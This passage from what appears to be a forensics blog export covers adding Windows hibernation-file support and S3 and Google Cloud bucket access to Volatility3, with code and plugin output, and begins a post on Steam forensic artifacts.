contains multiple **compression sets**. Each compression set contains a header structure giving information about how many page descriptors it contains, the compression algorithm used and the size of the compressed concatenated pages of the set.\\n\\nThe compression algorithm used can be one the following:\\n\\n-\\tNone: the pages are stored uncompressed\\n-\\tXpress: The pages are stored using the Microsoft Xpress LZ77 Algorithm [^3]\\n-\\tHuffmanXpress: The pages are stored using the Microsoft Xpress LZ77+Huffman Algorithm [^3] [^4]\\n\\nAll the page descriptors are located after the header and are describing where the pages reside in the decompressed data.\\n\\n![alt text](../images/hibernation/3.png \\"Structure\\")\\n\\n## Creating a volatility3 translation layer\\n\\nTo be able to read multiple memory image formats, the volatility3 framework is using what\u2019s called \u201cTranslation Layers\u201d.  Each layer in volatility3 focuses on a particular aspect of memory forensics, such as parsing specific data structures, analyzing various kinds of artifacts, or understanding specific evidence formats. The layers can be seen as individual building blocks that can be stacked on top of each other in a specific order to build the right context before extracting data for analysis. As an example, a memory image with the \\"vmem\\" format will induce the stacking of the \\"VmwareLayer\\" to be able to read such file format and extract memory pages.\\n\\nIn our case, when the framework is requesting several bytes at a specific physical address, it needs to understand the structure of the hibernation file and how to extract the right pages. For this, we have to indicate to the framework for a given memory \u201csegment\u201d, the corresponding set of pages.\\n\\nThe Hibernation layer role is to provide the volatility framework with the following information :\\n\\n-\\tCheck the file header to see if the layer needs to be stacked (check the signature to verify it is a hibernation file)\\n-\\tBuild a list of segments: A segment is here to translates a given physical address to an offset inside of the uncompressed data of the relevant compression set.\\n-\\tProvide the decompression method for a given segment: Our layer needs to be able to decompress a given compression set and returns the number of bytes requested by the upper layer.\\n\\n ![alt text](../images/hibernation/4.png \\"Structure\\" )\\n\\n### Implementation of the different compression algorithms\\n\\nWindows is using two proprietary compression algorithms to compress the pages:\\n\\n-\\tXpress: The Microsoft Xpress LZ77 Decompression Algorithm [^3]\\n-\\tHuffmanXpress: Microsoft Xpress LZ77+Huffman Decompression Algorithm [^3] [^4]\\n\\nThose two algorithms were implemented and added to the volatility3 framework codecs without the needs of using the Windows API via cstruct (making this layer OS independant). Those algorithms are well documented but python3 is not really the best programming language to perform bitwise operations. Thus the developpement of those two algorithm took time to make sure that the decompressed page using our implementation is giving the same result as the native API [^5]\\n\\n### Proof Of Concept\\n\\nAfter implementing this new translation layer, it was time to test it against multiple hibernation files. Knowing that we need to do a lot of decompressions operations, the hibernation layer is meant to be combine with the \u201clayerwriter\u201d plugin to create a raw memory image and then analyze it with the windows plugins. Indeed, the decompression of a set takes time and most of the plugin need to scan the entire memory dump pages making a lot of decompression operations thus slowing the framework. Creating a raw memory dump first is the best approach here for performances. To this end, 2 new plugins were added to the volatility3 framework:\\n\\n- **windows.hibernation.Info** : Display the basic information about the hibernation file and if it seems exploitable.\\n- **windows.hibernation.Dump** : Convert the hibernation file into a raw memory dump (based on the layerwriter plugin)\\n\\n\\nThe generation of the raw memory file was performed on 8 hibernations files from different versions of Windows:\\n\\n\\n| Version / Target    | hiberfile size     |       Conversion time  |\\n| ------------------|:-------------:|:----------------------:|\\n| Windows 8 x64 / Laptop |8GB|\\t~30 minutes |\\n| Windows 10 1507 x64 / Laptop |8GB|\\t~20 minutes  |\\n| Windows 10 1607 x64 / Laptop |8GB|\\t~20 minutes  |\\n| Windows 10 1809 x64 / KVM |8GB|\\t~10 minutes  \\t |\\n| Windows 10 1809 x64 / KVM |4GB|\\t~5 minutes  \\t |\\n| Windows 10 22H02 x64 / Laptop |8GB|   ~60 minutes\\t \\t |\\n| Windows 10 22H02 x64 / Laptop |16GB|   ~100 minutes\\t \\t |\\n| Windows 11 23H02 x64 / Laptop |8GB|   ~100 minutes\\t \\t |\\n\\n\\n> **Note :** On Windows 1809 hiberfile from a KVM, it was found that pages were located only in the boot section and none in the kernel section. The compressed data were either using the Xpress LZ77 compression or were not compressed but the Huffman variant was not identified. On Windows 22H2, most of the pages are located inside the kernel section using both plain LZ77 and LZ77+Huffman compression. It is not clear how Microsoft decides which compression algorithm is used and if both sections are used to store the pages.\\n\\n\\n\\n#### Usage : Conversion\\nFirstly, we check if the hibernation file seems exploitable :\\n\\n```\\n~/work/DFIR/volatility3\xbb ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Info\\nVolatility 3 Framework 2.5.1\\nProgress:  100.00               PDB scanning finished\\nVariable        Value\\nSignature       b\'HIBR\'\\nPageSize        4096\\nComment The hibernation file header signature is correct.\\nSystem Time     2023-11-03 20:32:25\\nFirstBootRestorePage    0x23\\nNumPagesForLoader       32199\\n```\\n\\nNext, we can try to convert the hibernation file to a raw file:\\n```\\n~/work/DFIR/volatility3\xbb ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Dump -h\\nusage: volatility windows.hibernation.Dump [-h] --version VERSION\\n\\noptional arguments:\\n  -h, --help         show this help message and exit\\n  --version VERSION  The Windows version of the hibernation file :\\n        0=>[Windows 10 1703 to Windows 11 23H2]\\n        1=>[Windows 8/8.1]\\n        2=>[Windows 10 1507 to 1511]\\n        3=>[Windows 10 1607]\\n```\\n\\n```\\n~/work/DFIR/volatility3\xbb ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Dump --version 2\\nStatus\\nProgress:   99.99               Writing layer memory_layer\\nThe hibernation file was converted to memory_layer.raw\\n```\\n\\n#### Example: pslist\\n```\\n~/work/DFIR/volatility3\xbb ./vol.py -f memory_layer.raw windows.pslist\\nVolatility 3 Framework 2.5.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nPID\\tPPID\\tImageFileName\\tOffset(V)\\tThreads\\tHandles\\tSessionId\\tWow64\\tCreateTime\\tExitTime\\tFile output\\n\\n4\\t0\\tSystem\\t0xe5072e280300\\t182\\t-\\tN/A\\tFalse\\t2023-09-30 14:52:10.000000 \\tN/A\\tDisabled\\n136\\t4\\tRegistry\\t0xe5072e2ee040\\t4\\t-\\tN/A\\tFalse\\t2023-09-30 14:52:09.000000 \\tN/A\\tDisabled\\n400\\t4\\tsmss.exe\\t0xe507322aa0c0\\t3\\t-\\tN/A\\tFalse\\t2023-09-30 14:52:10.000000 \\tN/A\\tDisabled\\n532\\t484\\tcsrss.exe\\t0xe50732242140\\t13\\t-\\t0\\tFalse\\t2023-09-30 14:52:11.000000 \\tN/A\\tDisabled\\n628\\t484\\twininit.exe\\t0xe50734c6a080\\t5\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n636\\t620\\tcsrss.exe\\t0xe50734c6f140\\t13\\t-\\t1\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n700\\t628\\tservices.exe\\t0xe50734cf0100\\t17\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n708\\t628\\tlsass.exe\\t0xe50734d25080\\t9\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n840\\t700\\tsvchost.exe\\t0xe50734d8e280\\t29\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n868\\t628\\tfontdrvhost.ex\\t0xe50734db9180\\t5\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n932\\t700\\tsvchost.exe\\t0xe50734b25540\\t13\\t-\\t0\\tFalse\\t2023-09-30 14:52:12.000000 \\tN/A\\tDisabled\\n[TRUNCATED]\\n```\\n\\n#### Example : netscan\\n\\n```\\n~/work/DFIR/volatility3\xbb ./vol.py -f memory_layer.raw windows.netscan\\nVolatility 3 Framework 2.5.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nOffset\\tProto\\tLocalAddr\\tLocalPort\\tForeignAddr\\tForeignPort\\tState\\tPID\\tOwner\\tCreated\\n\\n0xe507320e1b00\\tTCPv4\\t127.0.0.1\\t49743\\t127.0.0.1\\t49742\\tESTABLISHED\\t6660\\tRiotClientServ\\t2023-09-30 14:52:33.000000\\n0xe50733c5ba60\\tTCPv4\\t192.168.122.74\\t49883\\t8.247.201.124\\t443\\tESTABLISHED\\t6660\\tRiotClientServ\\t2023-09-30 14:52:38.000000\\n0xe50734ab2d00\\tTCPv4\\t0.0.0.0\\t135\\t0.0.0.0\\t0\\tLISTENING\\t932\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe50734ab2d00\\tTCPv6\\t::\\t135\\t::\\t0\\tLISTENING\\t932\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe50734ab2e50\\tTCPv4\\t0.0.0.0\\t49664\\t0.0.0.0\\t0\\tLISTENING\\t628\\twininit.exe\\t2023-09-30 14:52:12.000000\\n0xe50734ab2e50\\tTCPv6\\t::\\t49664\\t::\\t0\\tLISTENING\\t628\\twininit.exe\\t2023-09-30 14:52:12.000000\\n0xe50734ab34e0\\tTCPv4\\t0.0.0.0\\t49664\\t0.0.0.0\\t0\\tLISTENING\\t628\\twininit.exe\\t2023-09-30 14:52:12.000000\\n0xe50734ab38d0\\tTCPv4\\t0.0.0.0\\t135\\t0.0.0.0\\t0\\tLISTENING\\t932\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe50734d624e0\\tTCPv4\\t192.168.122.74\\t49687\\t20.223.46.67\\t443\\tESTABLISHED\\t2552\\tMsMpEng.exe\\t2023-09-30 14:52:17.000000\\n0xe5073540a990\\tTCPv4\\t192.168.122.74\\t139\\t0.0.0.0\\t0\\tLISTENING\\t4\\tSystem\\t2023-09-30 14:52:12.000000\\n0xe5073540b410\\tTCPv4\\t0.0.0.0\\t49665\\t0.0.0.0\\t0\\tLISTENING\\t952\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe5073540b800\\tTCPv4\\t0.0.0.0\\t49666\\t0.0.0.0\\t0\\tLISTENING\\t1416\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe5073540c130\\tTCPv4\\t0.0.0.0\\t49666\\t0.0.0.0\\t0\\tLISTENING\\t1416\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe5073540c130\\tTCPv6\\t::\\t49666\\t::\\t0\\tLISTENING\\t1416\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe5073540c3d0\\tTCPv4\\t0.0.0.0\\t49665\\t0.0.0.0\\t0\\tLISTENING\\t952\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n0xe5073540c3d0\\tTCPv6\\t::\\t49665\\t::\\t0\\tLISTENING\\t952\\tsvchost.exe\\t2023-09-30 14:52:12.000000\\n[TRUNCATED]\\n```\\n\\n\\n\\n## Conclusion\\n\\nFor all tested files, the framework was able to extract and decompress all of the pages in each restoration sets. The hibernation layer **currently only support Windows 8 x64 to Windows 11 23H2 x64 hibernation files**. Windows server hibernation analysis was not tested yet but it will come in time. Hopping the forensics community will also test this new addition and give some feedback to improve this layer. You can find the feature here: https://github.com/forensicxlab/volatility3/tree/feature/hibernation-layer.\\n\\nHoping this article will bring back the interests of the Digital Forensics community to hibernation files which are very valuable when available.\\n\\nSpecial thanks to Chad Tilbury @chadtilbury who gave me the motivation to dive into this project and the team of researchers behind the Hibernation file structure analysis (Joe T. Sylve, Vico Marziale, Golden G. Richard III).\\n\\n>Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article or to comment on the integration to the volatility framework.\\n\\n[^1]: https://www.cct.lsu.edu/~golden/Papers/sylvehiber.pdf\\n[^2]: https://www.vergiliusproject.com/kernels/x64/Windows%2011/Insider%20Preview%20(Jun%202021)/PO_MEMORY_IMAGE\\n[^3]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/a8b7cb0a-92a6-4187-a23b-5e14273b96f8\\n[^4]: https://raw.githubusercontent.com/Velocidex/go-prefetch/master/lzxpress.go\\n[^5]: https://learn.microsoft.com/en-us/windows/win32/cmpapi/using-the-compression-api"},{"id":"vols3","metadata":{"permalink":"/blog/vols3","source":"@site/blog/2023-08-23-vols3/index.md","title":"\ud83d\udcd8 Volatility3 - Remote analysis on cloud object-storage.","description":"Memory forensics is a huge help when performing an investigation and during incident response. Collecting memory images and analyzing them at scale is a challenge.","date":"2023-08-23T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Volatility","permalink":"/blog/tags/volatility"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"}],"readingTime":8.64,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"vols3","title":"\ud83d\udcd8 Volatility3 - Remote analysis on cloud object-storage.","authors":["k1nd0ne"],"tags":["DFIR","Volatility","Memory Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udcd8 Volatility3: Modern Windows Hibernation file analysis","permalink":"/blog/hibernation"},"nextItem":{"title":"\ud83d\udd26 Video Games Forensics - Steam","permalink":"/blog/steam"}},"content":"Memory forensics is a huge help when performing an investigation and during incident response. Collecting memory images and analyzing them at scale is a challenge.\\n\\nIt is crucial to have the capability of examining memory images on storage platforms other than traditional file systems. With the emergence of cloud technologies, new forms of storage known as object storage have emerged. Enabling memory analysis on object storage provides exciting opportunities for innovation and advancement.\\n\\nIn this article, we will go through the journey of making the volatility3 framework compatible with s3 object-storage to perform memory analysis over the network. Also, the reader will discover how this new capability can and will be applied to the VolWeb 2.0 project which is still in developpement.\\n\\n> **Disclaimer :** All of the information about the volatility3 framework given in this blogpost are from my own understanding of the framework and of the project documentation[^1]. Feel free to contact me at felix.guyard@forensicxlab.com to correct any mistake made in the explanations.\\n\\n[^1]: https://volatility3.readthedocs.io/en/latest/index.html\\n[^2]: https://github.com/fsspec/s3fs/\\n[^3]: https://gcsfs.readthedocs.io/en/latest/#\\n\\n\x3c!-- truncate --\x3e\\n\\n## Object-storage\\n\\nObject storage is a type of data storage architecture that manages data as objects, rather than as blocks or files like traditional storage systems. In object storage, a unique identifier is assigned to each piece of data and stored in a flat address space. These objects can contain not only the data itself, but also metadata and other attributes that provide additional information about the object. One of the key features of object storage is its scalability and it is ideal for storing big data sets like digital forensics evidence for example.\\n\\n## Support of object-storage in volatility3\\n\\n### Volatility3 state of the art\\n\\nThe native volatility3 framework currently provides one method for accessing data when performing the contextualization on a memory image which is direct access on a traditionnal filesystem.\\n\\nWhen an analyst is using volatility3 to extract data using a plugin, the framework is building the context \\"behind the scenes\\", which is the most critical step in the memory forensics workflow aside from the aquisition and analysis steps. This step is too often overlooked/forgotten by some investigators.\\n\\nIn the framework, the data contextualisation is made via \\"layering\\" and \\"stacking\\".\\nEach layer in volatility3 focuses on a particular aspect of memory forensics, such as parsing specific data structures, analyzing various kinds of artifacts, or understanding specific evidence formats. The layers can be seen as individual building blocks that can be stacked on top of each other in a specific order to build the right context before extracting data for analysis. As an example, a memory image with the \\"vmem\\" format will induce the stacking of the \\"VmwareLayer\\" to be able to read such file format and extract data.\\n\\nOne of the layer is called the \\"FileLayer\\" or \\"physical\\". One of the usage of this layer by the framework is to know how to locate, open, read and overall access resources of the evidence provided by the investigator. The FileLayer is using what is called a \\"ResourceAccessor\\" to interface with the physical evidence.\\n\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/vols3/1.png \\"Arch 1\\")\\n</div>\\n\\n\\n\\n### Adding bucketS3 support to the FileLayer\\n\\nThe FileLayer currently support one type of resource accessor which is the **file://** and **http(s)://** url patterns. They are used to read the evidence and remote pdb files by using the urllib python3 library.\\n\\nBy giving the possibility to the analyst to indicate that the evidence as to be read from remote object storage we can pass this information to the context and create an other resource accessor.\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/vols3/2.png \\"Arch 2\\")\\n</div>\\n\\n\\n\\nHere is what was done to make this possible :\\n\\nAdding new mutually exclusive argument group to the framework CLI : \\"-s3/--amazon-bucket\\"/\\"-gs/--google-bucket\\"\\n\\n```python\\ngroup = parser.add_mutually_exclusive_group()\\n\\ngroup.add_argument(\\n\\t\\"-s3\\",\\n\\t\\"--amazon-bucket\\",\\n\\taction=\'store_true\',\\n\\thelp=\\"The file provided will come from an amazon bucket\\",\\n)\\n\\ngroup.add_argument(\\n\\t\\"-gs\\",\\n\\t\\"--google-bucket\\",\\n\\taction=\'store_true\',\\n\\thelp=\\"The file provided will come from a google bucket\\",\\n)\\n```\\n\\nNext the CLI will check that the required environment variables are present to reach the bucket requested. Here is an example for Amazon S3/Minio.\\n\\n```python\\n        if args.amazon_bucket:\\n            # First check if the global variables are set and set the cloud location\\n            try:\\n                aws_access_key_id =  os.getenv(\\"AWS_ACCESS_KEY_ID\\")\\n                aws_secret_access_key = os.getenv(\\"AWS_SECRET_ACCESS_KEY\\")\\n                endpoint_url = os.getenv(\\"AWS_ENDPOINT_URL\\")\\n                if aws_access_key_id is None:\\n                    raise ValueError(\\"AWS_ACCESS_KEY_ID environment variable is not set\\")\\n                if aws_secret_access_key is None:\\n                    raise ValueError(\\"AWS_SECRET_ACCESS_KEY environment variable is not set\\")\\n                if endpoint_url is None:\\n                    raise ValueError(\\"AWS_ENDPOINT_URL environment variable is not set\\")\\n            except ValueError as excp:\\n                parser.error(str(excp))\\n            except KeyError as excp:\\n                parser.error(str(excp) + \\" environment variable is not set\\")\\n            ctx.config[\\"Cloud.AWS\\"] = \\"True\\"\\n```\\n\\nWhen stacking the various layers and attaching them to a specific requirement, the FileLayer is stacked :\\n```\\nphysical_layer = physical.FileLayer(\\n\\tnew_context, current_config_path, current_layer_name\\n)\\nnew_context.add_layer(physical_layer)\\n```\\n\\nNotice that the FileLayer object is created. We need to enhance the FileLayer object in order for it to determine the right resource accessor by looking at the context configuration:\\n\\n```python\\nclass FileLayer(interfaces.layers.DataLayerInterface):\\n    \\"\\"\\"a DataLayer backed by a file on the filesystem.\\"\\"\\"\\n\\n    def __init__(\\n        self,\\n        context: interfaces.context.ContextInterface,\\n        config_path: str,\\n        name: str,\\n        metadata: Optional[Dict[str, Any]] = None,\\n    ) -> None:\\n        super().__init__(\\n            context=context, config_path=config_path, name=name, metadata=metadata\\n        )\\n        if \\"Cloud.AWS\\" in self.context.config and not \\"pdbreader.FileLayer.location\\" in self.context.config:\\n            self._accessor = resources.S3ResourceAccessor()\\n\\n        elif \\"Cloud.Google\\" in self.context.config and not \\"pdbreader.FileLayer.location\\" in self.context.config:\\n            self._accessor = resources.GCResourceAccessor(self.context)\\n\\n        else:\\n            self._accessor = resources.ResourceAccessor()\\n[...]\\n```\\n\\nThen, we define our custom resource accessors, the current accessors added are supporting AWS/Minio and Google Cloud buckets. Notice the use of s3fs[^2] and gcsfs[^3] libraries.\\n```python\\n[...]\\nimport s3fs\\nimport gcsfs\\n[...]\\nclass S3ResourceAccessor(object):\\n    def __init__(\\n        self,\\n    ):\\n        self.s3 = s3fs.S3FileSystem()\\n    def open(self, url: str, mode: str = \\"rb\\") -> Any:\\n        return self.s3.open(url, mode)\\n\\nclass GCResourceAccessor(object):\\n    def __init__(\\n        self,\\n        context: interfaces.context.ContextInterface,\\n    ):\\n        self.s3 = gcsfs.GCSFileSystem(project=context.config[\'Cloud.Google.project_id\'], token=context.config[\'Cloud.Google.application_credentials\'])\\n    def open(self, url: str, mode: str = \\"rb\\") -> Any:\\n        return self.s3.open(url, mode)\\n```\\n\\n### Testing\\n\\nIt is now time to test the modified framework. Memory images between 1 and 8 gb were used for those tests.\\n\\n#### On-Premise MIN.IO\\n\\n```bash\\n~\xbb export AWS_ENDPOINT_URL=http://127.0.0.1:9000\\n~\xbb export AWS_ACCESS_KEY_ID=user\\n~\xbb export AWS_SECRET_ACCESS_KEY=password\\n\\n~\xbb vol -s3 -f s3://20acf5e8-ab93-42ff-b87a-15065da1016c/Snapshot6.vmem windows.pslist --dump --pid 244\\nVolatility 3 Framework 2.4.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nPID\\tPPID\\tImageFileName\\tOffset(V)\\tThreads\\tHandles\\tSessionId\\tWow64\\tCreateTime\\tExitTime\\tFile output\\n\\n244\\t4\\tsmss.exe\\t0xfa8002c33b30\\t2\\t29\\tN/A\\tFalse\\t2020-12-27 06:18:43.000000 \\tN/A\\tpid.244.0x48080000.dmp\\n\\n```\\n\\n\\n\\n#### AWS remote s3 bucket using volshell\\n```bash\\n~\xbb export AWS_ENDPOINT_URL=\\"\\" # no endpoint url will point to aws by default\\n~\xbb export AWS_ACCESS_KEY_ID=REDACTED\\n~\xbb export AWS_SECRET_ACCESS_KEY=REDACTED\\n\\n~\xbb volshell -s3 -f s3://20acf5e8-ab93-42ff-b87a-15065da1016c/Snapshot6.vmem -w\\nVolshell (Volatility 3 Framework) 2.5.0\\nReadline imported successfully\\tPDB scanning finished\\n\\n    Call help() to see available functions\\n\\n    Volshell mode        : Windows\\n    Current Layer        : layer_name\\n    Current Symbol Table : symbol_table_name1\\n    Current Kernel Name  : kernel\\n\\n(layer_name) >>> from volatility3.plugins.windows import pslist\\n(layer_name) >>> pslist.PsList.get_requirements()\\n(layer_name) >>> display_plugin_output(pslist.PsList, kernel = self.config[\'kernel\'])\\nID\\tPPID\\tImageFileName\\tOffset(V)\\tThreads\\tHandles\\tSessionId\\tWow64\\tCreateTime\\tExitTime\\tFile output\\n4\\t0\\tSystem\\t0xfa80024b3890\\t83\\t519\\tN/A\\tFalse\\t2020-12-27 06:18:43.000000 \\tN/A\\tDisabled\\n244\\t4\\tsmss.exe\\t0xfa8002c33b30\\t2\\t29\\tN/A\\tFalse\\t2020-12-27 06:18:43.000000 \\tN/A\\tDisabled\\n332\\t324\\tcsrss.exe\\t0xfa8002e79b30\\t9\\t562\\t0\\tFalse\\t2020-12-27 06:18:49.000000 \\tN/A\\tDisabled\\n384\\t376\\tcsrss.exe\\t0xfa8003a0f8a0\\t10\\t171\\t1\\tFalse\\t2020-12-27 06:18:50.000000 \\tN/A\\tDisabled\\n392\\t324\\twininit.exe\\t0xfa8003a12060\\t5\\t80\\t0\\tFalse\\t2020-12-27 06:18:50.000000 \\tN/A\\tDisabled\\n428\\t376\\twinlogon.exe\\t0xfa8003a31060\\t5\\t120\\t1\\tFalse\\t2020-12-27 06:18:50.000000 \\tN/A\\tDisabled\\n```\\n\\n#### Google cloud bucket\\n\\n```bash\\n~\xbb export GOOGLE_PROJECT_ID=REDACTED\\n~\xbb export GOOGLE_APPLICATION_CREDENTIALS=/PATH/gcreds.json\\n\\n~ \xbb vol -gs -f gs://volweb/Snapshot6.vmem windows.dlllist\\nVolatility 3 Framework 2.4.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nPID\\tProcess\\tBase\\tSize\\tName\\tPath\\tLoadTime\\tFile output\\n\\n244\\tsmss.exe\\t0x48080000\\t0x20000\\tsmss.exe\\t\\\\SystemRoot\\\\System32\\\\smss.exe\\tN/A\\tDisabled\\n244\\tsmss.exe\\t0x777e0000\\t0x1a9000\\tntdll.dll\\tC:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\\tN/A\\tDisabled\\n332\\tcsrss.exe\\t0x49b80000\\t0x6000\\tcsrss.exe\\tC:\\\\Windows\\\\system32\\\\csrss.exe\\tN/A\\tDisabled\\n332\\tcsrss.exe\\t0x777e0000\\t0x1a9000\\tntdll.dll\\tC:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\\tN/A\\tDisabled\\n[...]\\n```\\n\\n\\n## Applications\\n\\nOne can ask what are the potential applications after these new additions to the framework.\\n\\n- Remote investigation: Memory forensics can be performed on object storage without requiring physical access to the device hosting the storage. This allows for remote investigations, making it more convenient and efficient.\\n\\n- Scalability: Object storage over the network offers scalability, allowing the storage capacity to be expanded easily when dealing with large data volumes. This is particularly useful when performing memory forensics on extensive datasets.\\n\\n- Improved Collaboration: By conducting memory forensics on object storage accessible over the network, multiple IT specialists and forensic experts can collaborate on the investigation simultaneously. This promotes knowledge sharing and enhances the chances of identifying critical evidence.\\n\\n- Memory Acquisition at scale : One can script memory acquisition and deploy evidence collection on multiple system by storing the result into an On-Premise solution like Minio or in a cloud solution like AWS.\\n\\n- No third party installation : Some people don\'t like to have \\"agent-base\\" solutions installed on their assets to perform memory forensics. Once the evidence are acquired, memory forensics will be performed on a dedicated environment.\\n\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/vols3/3.png \\"Arch 3\\")\\n</div>\\n\\n\\n\\n\\n## Conclusion\\n\\nTo conclude, the goal of this addition to the volatility3 framework is to give more capabilities to digital investigators and incident responders when performing memory forensics. The fork of the project implementing this feature is available for you to review the code : https://github.com/forensicxlab/volatility3/tree/feature/bucket-s3 .\\n\\nLike all solutions, there are downsides to remote memory forensics. Indeed performing remote memory forensics will have an impact on performances and the investigator need to choose wisely about the solution used. However with cloud-computing network performances, network memory forensics can be very efficient. In a futur blogpost, a concrete application of remote memory forensics will be demonstrated by introducing VolWeb 2.0 which is still in development at the time of writing of this article.\\n\\n>Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article or to comment on the integration to the volatility framework."},{"id":"steam","metadata":{"permalink":"/blog/steam","source":"@site/blog/2023-07-05-steam/index.md","title":"\ud83d\udd26 Video Games Forensics - Steam","description":"Video games have become an integral part of our culture, providing entertainment and social opportunities. Unfortunately, criminals have also begun to take advantage of modern video games and their ever-growing capabilities to conduct illegal activities. Organized crime, hate spread, and pedophilia have been documented occurring within games, opening up the potential to a world of cybercrime.","date":"2023-07-05T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Steam","permalink":"/blog/tags/steam"},{"inline":true,"label":"Linux","permalink":"/blog/tags/linux"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"},{"inline":true,"label":"Mac","permalink":"/blog/tags/mac"},{"inline":true,"label":"Video Games","permalink":"/blog/tags/video-games"}],"readingTime":6.29,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"steam","title":"\ud83d\udd26 Video Games Forensics - Steam","authors":["k1nd0ne"],"tags":["DFIR","Steam","Linux","Windows","Mac","Video Games"]},"unlisted":false,"prevItem":{"title":"\ud83d\udcd8 Volatility3 - Remote analysis on cloud object-storage.","permalink":"/blog/vols3"},"nextItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - KeePass","permalink":"/blog/keepass"}},"content":"Video games have become an integral part of our culture, providing entertainment and social opportunities. Unfortunately, criminals have also begun to take advantage of modern video games and their ever-growing capabilities to conduct illegal activities. Organized crime, hate spread, and pedophilia have been documented occurring within games, opening up the potential to a world of cybercrime.\\n\\nDigital forensics on the Steam application can be especially useful for law enforcement in tracking down and prosecuting these cybercriminals. By investigating video game applications like Steam, digital footprints that can be used to link individuals to games, transactions, and even other players. Once these links are established, they can then used to build a case against the perpetrators. In this article, the reader will learn about some artifacts that can give releavant information left on a disk during a post-mortem analysis.\\n\\n> **Note :** All of the information about the investigated user displayed in the following findings are redacted.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n# Steam integrated browser artifacts\\n\\nA dedicated web browser is built into the Steam software (the Steam application is just another derived version of chromium). It can even be accessed while playing in game. It is a convinient way for gamers to look for something online without quitting the game. Therefore, interesting artifacts can be retrieved in the same way a digital forensics investigator would do when performing a Chrome analysis.\\n\\nLocations:\\n- Windows 10 : `%UserProfile%\\\\AppData\\\\Local\\\\Steam\\\\htmlcache\\\\`\\n- Ubuntu : `$HOME/.local/share/Steam/config/htmlcache/`\\n- MacOS : `$HOME/Library/Application Support/Steam/config/htmlcache/`\\n\\nBy using opensource investigation tools like Hindsight [^1], one can extract browser Cookies (and decrypt them), Cache, Session Storage, Local Storage, History, Visited Links, etc...\\n\\n![alt text](../images/steam/steam_1.png \\"HindSight\\")\\n\\n> On Windows, a base64 encoded DPAPI key can be recovered in the following path : `%UserProfile%\\\\AppData\\\\Local\\\\Steam\\\\htmlcache\\\\LocalProfs.json`\\n\\n> ![alt text](../images/steam/3.png \\"DPAPI\\") DPAPI encryption is based upon user password, therefore one may be able to retrive the cleartext value of encrypted cookies. Learn more about DPAPI here : https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#32\\n\\n\\n# Miscellaneous: Friends, Installed games, Playtime and game sessions\\n\\nAs a digital forensics investigator, you might be interested about the Steam friends of the user you are investigating, the games he played and for how long.\\nAll of the Steam users and games have unique IDs used to talk to the servers and get various information.\\n\\n## Steam user account information\\n\\nThe user has two assigned unique IDs :\\n- The Steam ID : Used to identify a profile on the Steam community website.\\n- The account ID : Used to link the account to other various information (subscription, owned games,...)\\n\\n### Recovering the user\'s Steam id\\n\\nLocations:\\n- Windows 10: `%programfiles(x86)%\\\\Steam\\\\config\\\\loginusers.vdf`\\n- Ubuntu: `$HOME/.local/share/Steam/config/loginusers.vdf`\\n- MacOS: `$HOME/Library/Application Support/Steam/config/loginusers.vdf`\\n\\n> **Note :** The VDF file format is the Valve\'s KeyValue text file format. It is similar to the json file 